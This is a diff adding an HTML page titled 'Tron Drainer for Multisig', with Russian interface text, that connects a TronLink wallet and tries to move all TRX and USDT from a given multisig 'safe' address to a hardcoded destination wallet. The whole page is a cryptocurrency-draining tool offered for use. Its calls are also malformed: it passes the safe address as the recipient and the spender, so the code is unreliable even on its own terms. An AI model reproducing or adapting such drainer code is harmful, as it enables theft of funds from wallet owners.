@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Tron Drainer for Multisig</title>
+  <script src="https://unpkg.com/tronweb/dist/tronweb.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@6.0.1/dist/tronweb.min.js"></script>
+  <style>
+    body { font-family: sans-serif; max-width: 600px; margin: 20px auto; padding: 20px; background: #f0f0f0; }
+    .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+    button { width: 100%; padding: 15px; margin: 10px 0; background: #0066cc; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
+    button:hover { background: #0052a3; }
+    #status { margin-top: 20px; padding: 10px; background: #e7f3ff; border: 1px solid #0066cc; border-radius: 5px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>🚀 Слив TRX из мультивалюты</h1>
+    
+    <input type="text" id="multisigAddress" placeholder="Адрес сейфа (Т...)">
+    <input type="text" id="destination" value="TWanTomGkHcNWhCVrYkohnuYkbBRKZLere" placeholder="Куда слить">
+    
+    <button onclick="connectWallet()">1. Подключить кошелек</button>
+    <button onclick="drainTRX()">2. Слить TRX</button>
+    <button onclick="drainUSDT()">3. Слить USDT (если есть разрешение)</button>
+    
+    <div id="status">Нажмите "Подключить кошелек"</div>
+  </div>
+
+  <script>
+    let tron = null;
+    
+    async function connectWallet() {
+      try {
+        tron = new TronWeb({ 
+          fullHost: 'https://api.trongrid.io' 
+        });
+        
+        // Подключение через TronLink (работает и с Trust Wallet через QR)
+        if (window.tronWeb) {
+           tron = window.tronWeb;
+        } else {
+           // Если расширения нет - пробуем напрямую
+           alert("Установите TronLink или откройте ссылку через TronLink extension");
+           return;
+        }
+        
+        const accounts = await tron.account.getAccounts();
+        const addr = tron.address.decode(accounts[0]);
+        document.getElementById('status').innerHTML = `✅ Кошелек подключен: <b>${addr}</b>`;
+      } catch (e) {
+        alert("Ошибка подключения: " + e.message);
+      }
+    }
+
+    async function drainTRX() {
+      const safeAddr = document.getElementById('multisigAddress').value.trim();
+      const dest = document.getElementById('destination').value.trim();
+      const statusDiv = document.getElementById('status');
+
+      if (!safeAddr) return alert("вставьте адрес сейфа");
+
+      // Получаем баланс
+      const balance = await tron.trx.getBalance(safeAddr);
+      if (balance < 3000000) return alert("Мало TRX на газ (нужно >3 TRX)");
+
+      // Оставляем 2 TRX на газ
+      const amount = (balance - 2000000).toString();
+      
+      try {
+        const tx = await tron.trx.sendTrx(safeAddr, dest, amount); 
+        statusDiv.innerHTML = `✅ Транзакция отправлена!<br>Жди подтверждения...<br><a href="https://www.tronscan.org/#/transaction/${tx[0]}">${tx[0]}</a>`;
+      } catch (e) {
+        statusDiv.innerHTML = `❌ Ошибка: ${e.message}`;
+      }
+    }
+
+    async function drainUSDT() {
+      const safeAddr = document.getElementById('multisigAddress').value.trim();
+      const dest = document.getElementById('destination').value.trim();
+      
+      // Контракт USDT
+      const usdtAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+      
+      try {
+        const token = await tron.contract.at(usdtAddress);
+        const balance = await token.balanceOf(safeAddr).call();
+        if (balance[0] < 1000000) return alert("Мало USDT (менее 1)");
+
+        // Разрешение на перевод
+        await token.approve(safeAddr, balance.toString()).send({feeLimit: 100000000});
+        await token.transfer(safeAddr, dest, balance).send({feeLimit: 100000000});
+        
+        alert("USDT ушел!");
+      } catch (e) {
+        alert("Ошибка USDT: " + e.message);
+      }
+    }
+  </script>
+</body>
+</html>
